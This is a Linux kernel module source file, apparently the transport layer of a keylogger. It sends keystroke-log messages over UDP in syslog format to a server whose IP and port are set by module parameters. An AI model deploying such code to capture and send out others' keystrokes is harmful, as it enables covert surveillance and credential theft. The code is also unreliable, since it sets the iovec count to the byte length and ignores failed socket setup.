#include <linux/net.h>
#include <linux/in.h>
#include <linux/socket.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/stat.h>
#include <linux/moduleparam.h>
#include "keylogging_udp.h"

#define MESSAGE_SIZE 1088 // PRI + header + key logging message
#define IP ((u32)0x7f000001) //127.0.0.1
#define PRI 14 // 1*8 + 6 user-level informational messsages 
static struct socket *sock;
static struct sockaddr_in sin;
static struct msghdr msg;
static struct iovec iov;

mm_segment_t old_fs;
int sock_init, error, len;
char message[MESSAGE_SIZE];

static int port = 514; // default syslog-ng udp por
module_param(port, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(port, "UDP port for syslog-ng");

static char *ip = "127.000.000.001"; // default syslog-ng udp port
module_param(ip, charp, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(ip, "IP of the syslog-ng server");

static u32 parseIP(char * ip){
  u32 ret;
  int t[4];
  char * p;
  p = &ret;
  //sscanf(ip, "%d.%d.%d.%d",(int *)ap+3, (int *)ap+2, (int *)ap+1, (int *)ap );
  sscanf(ip, "%d.%d.%d.%d",t, t+1, t+2, t+3 );
  p[0] = (char)t[3];
  p[1] = (char)t[2];
  p[2] = (char)t[1];
  p[3] = (char)t[0];
  printk(KERN_INFO "Ip of syslog-ng: %s (0x%x)\n", ip, ret);
  return ret;
}

void perpare_keylogging(void){
  if (sock_init){
    printk(KERN_DEBUG "Socket aready exits. Release it!\n");
    release_keylogging(); 
  }

  /* Create socket for UDP*/
  error = sock_create(AF_INET, SOCK_DGRAM, IPPROTO_UDP, &sock);
  if (error<0)
    printk(KERN_DEBUG "Failed to create socket. Error %d\n",error);

  /* Connecte the socket */
  sin.sin_family = AF_INET;
  sin.sin_port = htons(port);
  sin.sin_addr.s_addr = htonl(parseIP(ip));
  error = sock->ops->connect(sock, (struct sockaddr *)&sin, sizeof(struct sockaddr), 0);
  if (error<0)
    printk(KERN_DEBUG "Failed to connect socket. Error %d\n",error);

  /* Prepare message header */
  msg.msg_flags = 0;
  msg.msg_name = &sin;
  msg.msg_namelen  = sizeof(struct sockaddr_in);
  msg.msg_control = NULL;
  msg.msg_controllen = 0;
  msg.msg_iov = &iov;
  sock_init = 1;
}

void send_udp(int pid, char * buf){
  if(sock_init){
    /* Syslog message */
    sprintf(message,"<%d> keylogging[%d]: %s\n", PRI, pid, buf);
    iov.iov_base = message;
    len = strlen(message);
    iov.iov_len = len;
    msg.msg_iovlen = len;
    /* Send the message */
    old_fs = get_fs();
    set_fs(KERNEL_DS);
    error = sock_sendmsg(sock,&msg,len);
    set_fs(old_fs);
  }
}

void release_keylogging(void){
  if(sock_init){
    sock_release(sock);
  }
}
